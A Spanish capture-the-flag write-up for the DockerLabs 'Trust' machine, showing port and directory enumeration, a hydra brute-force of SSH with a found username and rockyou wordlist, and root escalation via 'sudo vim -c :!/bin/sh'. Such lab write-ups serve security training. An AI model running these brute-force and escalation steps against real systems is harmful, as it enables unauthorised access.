# Trust
https://dockerlabs.es

*23/5/2024*

## ENUMERACION
nmap
```
└─$ nmap -p- --open --min-rate 5000 -sCV 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 14:06 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
servidor apache
```
└─$ whatweb 172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.17.0.2], Title[Apache2 Debian Default Page: It works]
```
listando directorios
```
└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,php.wak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php.wak,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
===============================================================
Finished
===============================================================
```

## ANALISIS DE VULNERABILIDADES

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/2300bc9c-6002-45d2-9d2e-6f490360e9be)

```
Vemos que en la pagina que encontramos hay un usuario el cual podremos usar para hacer un ataque de fuerza bruta al puerto ssh
```

## EXPLOTACION

```
└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 14:26:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

```
└─$ ssh mario@172.17.0.2                                       
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
mario@172.17.0.2's password: 
Linux 9f0de961961a 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@9f0de961961a:~$ whoami
mario
```


## POST-EXPLOTACION

Tenemos permiso en vim como usuario root
```
mario@9f0de961961a:/$ sudo -l 
[sudo] password for mario:                              
Matching Defaults entries for mario on 9f0de961961a:    
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
                                                        
User mario may run the following commands on 9f0de961961a:
    (ALL) /usr/bin/vim
```

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/e2337810-8956-4c51-9c71-a3c258ecb27c)

Escalamos privilegios con vim y tratamos las TTY
```
mario@9f0de961961a:/$ sudo vim -c ':!/bin/sh'           
                                                        
# whoami                                                
root                                                    
# script /dev/null -c bash                              
Script started, output log file is '/dev/null'.         
root@9f0de961961a:/# whoami
root
```

